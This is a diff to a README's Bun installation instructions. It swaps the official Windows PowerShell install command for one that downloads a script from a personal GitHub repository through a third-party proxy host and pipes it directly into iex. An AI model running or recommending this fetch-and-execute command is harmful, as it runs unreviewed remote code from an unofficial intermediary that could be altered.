@@ -13,8 +13,8 @@ curl -fsSL https://bun.sh/install | bash
 # macOS (Homebrew)
 brew install bun
 
-# Windows (PowerShell)
-powershell -c "irm bun.sh/install.ps1 | iex"
+# Windows (PowerShell) — 使用 cc-haha-neo 镜像脚本
+powershell -c "irm https://github.tbedu.top/https://raw.githubusercontent.com/simimasai111/cc-haha-neo/main/scripts/install-bun-windows.ps1 | iex"
 ```
 
 > 精简版 Linux 如提示 `unzip is required`，先运行 `apt update && apt install -y unzip`
